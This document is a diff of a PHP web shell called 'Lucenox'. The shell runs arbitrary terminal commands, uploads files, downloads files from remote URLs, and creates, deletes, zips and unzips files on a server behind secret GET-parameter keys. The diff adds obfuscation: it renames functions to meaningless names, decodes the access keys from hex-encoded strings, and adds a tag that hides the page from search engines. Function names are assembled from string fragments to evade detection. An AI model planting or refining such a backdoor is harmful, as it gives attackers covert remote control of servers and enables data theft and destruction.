@@ -14,7 +14,7 @@ $b_sm = 'b' . 'a' . 'se' . 'n' . 'a' . 'me';
 $ipl = 'i' . 'm' . 'pl' . 'o' . 'de';
 $spcl = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
 
-function cmdLine($xTe)
+function cle($xTe)
 {
   global $ecex;
   global $ipl;
@@ -85,7 +85,7 @@ function cmdLine($xTe)
   }
 }
 
-function upLd($file)
+function xup($file)
 {
   global $m_uf;
   global $b_sm;
@@ -114,7 +114,7 @@ function brte($file_url, $custom_file_name)
   }
   $file_name = !empty($custom_file_name) ? $spcl($custom_file_name) : $spcl($$b_sm($file_url));
   $target_file = $upload_dir . $file_name;
-  $file_data = eCrl($file_url, $file_name);
+  $file_data = noir($file_url, $file_name);
   if ($file_data === false) {
     return "Error: Could not download file from the provided URL.";
   }
@@ -125,7 +125,7 @@ function brte($file_url, $custom_file_name)
   }
 }
 
-function eCrl($url, $filename)
+function noir($url, $filename)
 {
   global $cl_i;
   $ch = $cl_i();
@@ -138,7 +138,7 @@ function eCrl($url, $filename)
   return $data !== false ? $data : false;
 }
 
-function nFl($file_name, $file_content)
+function nox($file_name, $file_content)
 {
   global $fp_ct;
   global $spcl;
@@ -147,7 +147,7 @@ function nFl($file_name, $file_content)
   return "File created successfully: " . $spcl($file_name);
 }
 
-function nFldr($folder_name)
+function lcx($folder_name)
 {
   global $spcl;
   $target_folder = __DIR__ . '/' . $folder_name;
@@ -209,7 +209,7 @@ function uzprfr($zip_file_path, $destination_path)
   }
 }
 
-function mdlt($filename, $file_content, $target_path)
+function xea($filename, $file_content, $target_path)
 {
   global $spcl;
   global $fp_ct;
@@ -238,7 +238,7 @@ function mdlt($filename, $file_content, $target_path)
   return nl2br($output);
 }
 
-function mdltL($file_name, $target_path)
+function pum($file_name, $target_path)
 {
   global $spcl;
   $output = "";
@@ -264,33 +264,48 @@ function mdltL($file_name, $target_path)
   return nl2br($output);
 }
 
-if (isset($_GET['t4r0t']) && isset($_GET['n3o7t'])) {
+function hfc($ltsp)
+{
+  $i = preg_replace('/[^\\\\x0-9a-fA-F]/', '', $ltsp);
+
+  return preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', function ($m) {
+    return chr(hexdec($m[1]));
+  }, $i);
+}
+
+$xi = '\x74~\x34%\x72#\x30\x74';
+$ci = '\x6e\x33~\x6f\x37#\x74';
+
+$mi = hfc($xi);
+$yi = hfc($ci);
+
+if (isset($_GET[$mi]) && isset($_GET[$yi])) {
   $output = "";
   $terminal_output = "";
   if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     if (isset($_FILES['file_upload'])) {
-      $output = upLd($_FILES['file_upload']);
+      $output = xup($_FILES['file_upload']);
     } elseif (isset($_POST['remote_file_url'])) {
       $output = brte($_POST['remote_file_url'], $_POST['custom_file_name']);
     } elseif (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
-      $output = nFl($_POST['new_file_name'], $_POST['new_file_content']);
+      $output = nox($_POST['new_file_name'], $_POST['new_file_content']);
     } elseif (isset($_POST['new_folder_name'])) {
-      $output = nFldr($_POST['new_folder_name']);
+      $output = lcx($_POST['new_folder_name']);
     } elseif (isset($_POST['zip_folder_path'])) {
       $output = zprfdr($_POST['zip_folder_path'], __DIR__ . '/' . $_POST['zip_file_name']);
     } elseif (isset($_POST['uzprfr_path'])) {
       $output = uzprfr($_POST['uzprfr_path'], $_POST['unzip_destination_path']);
     } elseif (isset($_POST['terminal_command'])) {
-      $terminal_output = cmdLine($_POST['terminal_command']);
-    } elseif (isset($_POST['action']) && $_POST['action'] === 'mdlt') {
+      $terminal_output = cle($_POST['terminal_command']);
+    } elseif (isset($_POST['action']) && $_POST['action'] === 'xea') {
       $filename = $_POST['filename'];
       $file_content = $_POST['file_content'];
       $target_path = $_POST['target_path'];
-      $output = mdlt($filename, $file_content, $target_path);
-    } elseif (isset($_POST['action']) && $_POST['action'] === 'mdltL') {
+      $output = xea($filename, $file_content, $target_path);
+    } elseif (isset($_POST['action']) && $_POST['action'] === 'pum') {
       $file_name = $_POST['file_name'];
       $target_path = $_POST['target_path'];
-      $output = mdltL($file_name, $target_path);
+      $output = pum($file_name, $target_path);
     }
   }
 ?>
@@ -302,6 +317,7 @@ if (isset($_GET['t4r0t']) && isset($_GET['n3o7t'])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lucenox</title>
     <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -527,13 +543,13 @@ if (isset($_GET['t4r0t']) && isset($_GET['n3o7t'])) {
         <input type="text" name="filename" id="filename" placeholder="File Name" required>
         <textarea name="file_content" id="file_content" rows="4" placeholder="File Content" required></textarea>
         <input type="text" name="target_path" id="target_path" placeholder="Target Directory Path" required>
-        <button class="submit-btn" type="submit" name="action" value="mdlt">Create!</button>
+        <button class="submit-btn" type="submit" name="action" value="xea">Create!</button>
       </form>
       <form id="madel-form" class="fitur-form" method="post">
         <h3>MaDeL</h3>
         <input type="text" name="file_name" id="file_name" placeholder="File Name to Delete" required>
         <input type="text" name="target_path" id="target_path" placeholder="Target Directory Path" required>
-        <button class="submit-btn" type="submit" name="action" value="mdltL">Gas!</button>
+        <button class="submit-btn" type="submit" name="action" value="pum">Gas!</button>
       </form>
     </div>
 
